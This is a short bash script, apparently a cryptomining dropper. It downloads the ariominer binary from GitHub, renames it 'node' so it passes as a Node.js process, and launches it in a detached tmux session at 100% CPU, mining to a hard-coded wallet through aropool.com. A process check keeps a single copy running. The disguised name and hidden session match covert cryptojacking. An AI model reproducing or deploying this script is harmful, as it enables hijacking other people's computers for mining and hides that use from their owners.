#! /bin/bash
set -x #echo on
if [ -f ${PWD}/node ]; then
    if pgrep -x "node" > /dev/null
then
    echo "scrip dang chay roi , ke cmn di "
    
else

echo "script da install , chay thoi "
tmux new-session -d -s my_session1 './node --mode miner --pool http://aropool.com --wallet 5mKUv6nXuCH8NMsc1CeEjmwVhgawPU3DTowP8j55hYA8BWz8e39UbuLK8gEWkDWJdNcZb38Pxxmfj1GXYMVJf389 --name test --cpu-intensity 100 --gpu-intensity-cblocks 0 --gpu-intensity-gblocks 0'
    
fi
exit
fi


wget https://github.com/bogdanadnan/ariominer/releases/download/v0.2.0/ariominer_v0.2.0_29.05.2019_linux.tar.gz
tar -zxf ariominer_v0.2.0_29.05.2019_linux.tar.gz
cd ariominer_v0.2.0_29.05.2019_linux
mv ariominer node
chmod +x node
tmux new-session -d -s my_session1 './node --mode miner --pool http://aropool.com --wallet 5mKUv6nXuCH8NMsc1CeEjmwVhgawPU3DTowP8j55hYA8BWz8e39UbuLK8gEWkDWJdNcZb38Pxxmfj1GXYMVJf389 --name test --cpu-intensity 100 --gpu-intensity-cblocks 0 --gpu-intensity-gblocks 0'
